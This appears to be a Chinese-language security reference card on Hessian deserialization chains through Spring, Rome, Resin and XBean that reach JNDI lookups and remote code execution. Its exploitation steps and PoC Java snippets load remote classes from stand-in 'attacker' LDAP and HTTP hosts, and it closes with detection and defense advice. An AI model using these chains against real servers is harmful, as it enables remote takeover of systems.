---
id: web-java-deser-hessian-jndi-outbound-chains
title: Hessian 出网 JNDI 链：Spring、Rome、Resin、XBean
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: hessian-jndi-outbound-chains
aliases:
- Hessian Spring JNDI 链
- Hessian Rome 链
- Hessian Resin 链
- Hessian XBean 链
- SimpleJndiBeanFactory lookup 链
- Hessian 出网利用
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- java
- hessian
- deserialization
- jndi
- spring
- rome
- resin
- xbean
- rce
cve: []
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:31:50+08:00'
  notes: 已对照原文核对 Spring PartiallyComparableAdvisorHolder/AbstractBeanFactoryPointcutAdvisor 调用栈、Rome ToStringBean/EqualsBean+JdbcRowSetImpl、Resin ContinuationContext、XBean ReadOnlyBinding 的对象构造与限制（Resin/XBean 需旧 JDK、出网）；原文 Rob/Spring 有调用栈、Resin/XBean 有代码片段，均无执行截图；PoC 未在本机执行。
---

## 一句话结论

在目标可出网且 classpath 含 Spring AOP/Context、Rome、Resin 或 XBean 时，Hessian 反序列化的 `map.put` 可经 `equals`/`toString` 把可控数据带到 `SimpleJndiBeanFactory.lookup`、`ToStringBean` getter、`ContinuationContext` 或 XBean `Reference`，最终触发 JNDI lookup 或二次反序列化，实现 RCE。

## 原理

- **Spring `PartiallyComparableAdvisorHolder`**：`toString` → `AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder.toString` → `AspectJPointcutAdvisor.getOrder` → `BeanFactoryAspectInstanceFactory.getOrder` → `SimpleJndiBeanFactory.getType` → `JndiTemplate.lookup` → `InitialContext.lookup`。需要 spring-aop、spring-context。
- **Spring `AbstractBeanFactoryPointcutAdvisor`**：`equals` → `AbstractPointcutAdvisor.equals` → `AbstractBeanFactoryPointcutAdvisor.getAdvice` → `SimpleJndiBeanFactory.getBean` → `lookup`。同样依赖 spring-aop/context。
- 两条 Spring 链的关键 sink 是 `SimpleJndiBeanFactory` 的 lookup 族方法；source 是 `HashMap.putVal` 触发的 `equals`，常配合 `HotSwappableTargetSource.equals` 与哈希碰撞（`XString`/`QName` 的 `unhash` 构造）保证进入比较。
- **Rome**：`ToStringBean.toString` 会遍历 bean 属性并调用 getter；把 `JdbcRowSetImpl` 作为 bean，则 getter `getDatabaseMetaData` 触发 JNDI；把 `Templates` 作为 bean 可触发二次反序列化（`SignedObject` 包裹）。`EqualsBean` 负责让 `HashMap.put` 走到 `ToStringBean`。
- **Resin**：构造 `CannotProceedException` 的 `resolvedObj` 为恶意 `Reference`，再构造 `ContinuationContext`；`ContinuationContext` 的 `listBindings` 会调用 `NamingManager.getObjectInstance`，按 `Reference` 的 `factory`/`factoryLocation` 远程加载工厂类。限制：只能 RMI 加载远程工厂类，适用于 JDK<8u121。
- **XBean**：`ContextUtil$ReadOnlyBinding` 持有 `Reference`，在 `equals`/`toString` 触发时由 `WritableContext`/NamingManager 处理 `Reference`，同样可远程加载。限制与 Resin 类似（旧 JDK）。
- 共同点：Hessian 只负责把对象图送进 `map.put` 的 `equals`/`toString`，真正的网络与类加载行为由 Spring/Rome/Resin/XBean 的既有逻辑完成；因此依赖与 JDK 版本决定链是否可用。

## 触发条件

- Hessian 反序列化入口可控。
- 目标 classpath 含对应依赖：spring-aop + spring-context（Spring 链）、rome 1.0（Rome）、resin 4.x（Resin）、xbean-naming（XBean）。
- 目标可出网访问攻击者的 LDAP/RMI/HTTP 服务；或攻击者能提供远程 Reference 工厂类。
- JNDI 远程类加载未被 JDK 限制（Resin/XBean 通常需 JDK<8u121；Spring/Rome 可打 LDAP 返回序列化 gadget 或本地工厂）。

## 利用步骤

1. 探测目标依赖（错误页、堆栈、jar 指纹、`Class.forName` 行为）。
2. 选择对应链并构造对象图：
   - Spring：`PartiallyComparableAdvisorHolder`（toString）或 `AbstractBeanFactoryPointcutAdvisor`（equals），内嵌 `SimpleJndiBeanFactory` 的 lookup 参数指向恶意 LDAP/RMI；
   - Rome：`ToStringBean(JdbcRowSetImpl.class, jdbcRowSet)` + `EqualsBean` + `HashMap`；
   - Resin/XBean：构造 `Reference` + `ContinuationContext`/`ReadOnlyBinding`，放入 HashMap 触发 equals。
3. 启动恶意 LDAP/RMI/HTTP 服务，返回恶意 Reference 工厂或序列化 gadget。
4. Hessian 序列化对象图并发送，服务端 `map.put` 触发链，发起 JNDI 请求。
5. 目标加载远程类/反序列化返回数据，执行命令。

## PoC

Rome → JNDI：

```java
JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
jdbcRowSet.setDataSourceName("ldap://attacker:1389/exp");

ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);
EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
HashMap<Object, Object> map = ReflectTools.makeMap(equalsBean, "any");

byte[] bytes = HessianTools.hessianSer2bytes(map, "2");
HessianTools.hessianDeser(bytes, "2");
```

Spring 链调用栈（关键片段）：

```text
AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder.toString
  -> AspectJPointcutAdvisor.getOrder
  -> BeanFactoryAspectInstanceFactory.getOrder
  -> SimpleJndiBeanFactory.getType
  -> JndiTemplate.lookup
  -> InitialContext.lookup
```

Resin（JDK<8u121）关键对象：

```java
Reference ref = new Reference("Calc", "Calc", "http://attacker:8000/");
CannotProceedException cpe = new CannotProceedException();
cpe.setResolvedObj(ref);
// 构造 ContinuationContext(cpe, env)，再用 QName/XString 做 hash 碰撞放入 HashMap
```

XBean 关键对象：

```java
Reference ref = new Reference("Calc", "Calc", "http://attacker:8000/");
WritableContext ctx = new WritableContext();
Object binding = Class.forName(
    "org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding")
    .getDeclaredConstructor(String.class, Object.class, Context.class)
    .newInstance("aaa", ref, ctx);
HashMap<Object, Object> map = ReflectTools.makeEqualMap(new XString("any"), binding);
```

原文给出各链的 POC 路径与调用栈；本卡记录链条结构与关键对象，未在本机执行。

## 变体与关联

- Spring 链也可配合 `HotSwappableTargetSource` 的 `equals` 直接触发，不依赖 `XString`。
- Rome 链可接 `SignedObject` 二次反序列化，绕过只允许一次反序列化的场景。
- 若目标不出网，改用 JDK-only 链（`System.load`、`ServerManagerImpl`）或 Groovy 链。
- `SimpleJndiBeanFactory` 的 lookup 方法可作为静态分析 sink，配合 tabby 等工具搜索新链。

## 检测与防御

- Hessian 入口使用允许列表，拒绝 `PartiallyComparableAdvisorHolder`、`AbstractBeanFactoryPointcutAdvisor`、`ToStringBean`、`EqualsBean`、`JdbcRowSetImpl`、`ContinuationContext`、`ReadOnlyBinding` 等。
- 限制服务端出站：禁止访问外部 LDAP/RMI/HTTP，尤其是 1389/1099 与非常规端口；启用出站代理白名单。
- 升级 JDK（8u121+ 限制远程 codebase，8u191+ 进一步限制 LDAP 远程类加载）并配合 `com.sun.jndi.ldap.object.trustURLCodebase=false`。
- 监控 JNDI lookup（`InitialContext.lookup`）、`NamingManager.getObjectInstance` 与异常 LDAP/RMI 连接。
- 移除不必要的 Spring AOP、Rome、Resin、XBean 依赖，缩小 gadget 面。
